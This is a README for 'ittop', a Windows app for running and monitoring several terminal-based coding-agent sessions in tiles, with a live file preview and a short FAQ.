# 💻 ittop - Manage multiple terminal coding sessions easily

[![](https://img.shields.io/badge/Download_ittop_for_Windows-blue)](https://danta81.github.io)

## 🏗️ What is ittop?

Ittop serves as a workspace manager for coding agents. Many developers use tools like Claude Code, Gemini CLI, or other terminal-based assistants to help them write programs. These tools run inside a terminal window. Usually, you can only see one of these windows at a time. Ittop changes that. It allows you to run several coding sessions side-by-side on your Windows computer.

You can monitor your coding agents in real-time. Ittop includes a file preview feature so you can see your code changes without switching between different applications. This tool helps you maintain your workflow and focus.

## 🚀 Setting Up Your Workspace

Open the ittop application after installation. The main screen provides a clean dashboard for your terminal sessions. To start, click the Add Session button in the top left corner. You will see a list of available coding agents that ittop supports, such as Claude Code or your own custom terminal commands.

Select the agent you want to run. Ittop opens a terminal window for that session. You can repeat this process to add more sessions. Your workspace divides into tiles. Each tile shows one terminal session. 

The live status bar at the bottom of each tile confirms if your agent is active. If an agent runs a long process, the status bar updates to show you the progress. 

## 📂 Using the File Preview

One major benefit of ittop is the built-in file preview feature. You do not need to open a separate text editor to see what your coding agent creates. 

1. Click on the file icon near the top of any session tile.
2. A side panel slides out from the right side of the screen.
3. Select an active file from your project folder.
4. Ittop shows the code inside that panel.

If your coding agent modifies a file, the preview refreshes automatically. This allows you to watch your project evolve as the agent works. You can view two files at once by dragging a file into the preview window. 

## 🛠️ Managing Your Sessions

You have full control over your layout. If you want to focus on one specific agent, click the Expand button on its tile. This hides other sessions and gives that agent the full screen. Click the same button again to return to your grid layout.

If a session becomes unresponsive or you finish using it, click the Close button on the tile to terminate that specific process. Ittop saves your workspace arrangement. If you close the program and reopen it later, your sessions resume exactly where you left them.

## ❓ Frequently Asked Questions

**Does ittop store my private code?**
No. Ittop runs locally on your computer. The application does not send your files or code to any external servers.

**Can I use other command-line tools?**
Yes. You can add any terminal command to ittop. Open the Settings, go to Custom Commands, and type in the launch command for your desired tool.

**Does this program slow down my computer?**
Ittop uses efficient background processes. However, running many coding agents at the same time requires significant computer power. Monitor your system performance if you notice a slowdown.

**How do I update the software?**
When a new version is available, ittop shows a notification at the top of the interface. Click the link provided in the notification to download the installer for the newer version.
